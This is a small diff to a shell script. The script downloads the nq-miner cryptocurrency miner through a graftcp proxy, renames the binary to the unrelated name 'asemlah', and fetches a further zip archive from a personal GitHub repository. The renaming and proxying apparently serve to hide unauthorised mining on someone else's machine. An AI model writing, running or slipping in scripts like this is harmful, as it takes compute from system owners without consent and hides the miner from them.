@@ -38,8 +38,9 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget -qO asemlah.tar.gz https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz
+./graftcp/graftcp wget -qO asemlah.tar.gz https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-0.99.7.tar.gz
 tar -xhf asemlah.tar.gz
+cd nq-miner
 mv nq-miner asemlah
 
 wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip
